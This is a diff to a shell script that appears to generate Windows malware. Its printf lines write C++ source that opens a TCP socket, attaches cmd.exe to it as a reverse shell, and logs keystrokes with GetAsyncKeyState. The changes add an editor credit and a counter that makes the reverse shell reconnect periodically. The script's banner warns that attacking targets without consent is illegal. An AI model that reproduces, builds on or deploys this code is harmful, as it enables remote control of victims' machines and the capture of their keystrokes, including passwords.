@@ -23,6 +23,7 @@ printf "           888      Y8b d88P                   Y8b d88P               \n
 printf "           888       \"Y88P\"                     \"Y88P\" v1.0\e[0m  \n"
 printf "\n"
 printf "      \e[1;92m         Author: @thelinuxchoice\e[0m\n"
+printf "      \e[1;92m         Edited by: @srmilton\e[0m\n"
 printf "      \e[101m:: Warning: Attacking targets without  ::\e[0m\n"
 printf "      \e[101m:: prior mutual consent is illegal!    ::\e[0m\n"
 printf "\n"
@@ -230,9 +231,12 @@ printf ' sui.hStdInput = sui.hStdOutput = sui.hStdError = (HANDLE) sl;\n' >> pro
 printf ' TCHAR commandLine[256] = "cmd.exe";\n' >> program.cpp
 printf ' CreateProcess(NULL, commandLine, NULL, NULL, TRUE, 0, NULL,NULL, &sui, &pi);\n' >> program.cpp
 printf 'int keys;\n' >> program.cpp
+printf 'int roll = 0;\n' >> program.cpp
 printf 'FILE *file;\n' >> program.cpp
 printf 'while(1) {\n' >> program.cpp
 lazy="%"
+printf 'roll++;\n' >> program.cpp
+printf 'if(roll == 200000){\n' >> program.cpp
 printf ' WSAStartup(MAKEWORD(2,2),&wsaData);\n' >> program.cpp
 printf ' sl = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP,NULL,(unsigned int)NULL,(unsigned int)NULL);\n' >> program.cpp
 printf ' sockcon.sin_family = AF_INET;\n' >> program.cpp
@@ -246,6 +250,9 @@ printf ' sui.hStdInput = sui.hStdOutput = sui.hStdError = (HANDLE) sl;\n' >> pro
 
 printf ' TCHAR commandLine[256] = "cmd.exe";\n' >> program.cpp
 printf ' CreateProcess(NULL, commandLine, NULL, NULL, TRUE, 0, NULL,NULL, &sui, &pi);\n' >> program.cpp
+printf 'roll = 0;\n' >> program.cpp
+printf '}\n' >> program.cpp
+
 
 printf '   for(keys = 32; keys <= 127; keys++) {\n' >> program.cpp
 printf '       if(GetAsyncKeyState(keys) == -32767) {\n' >> program.cpp
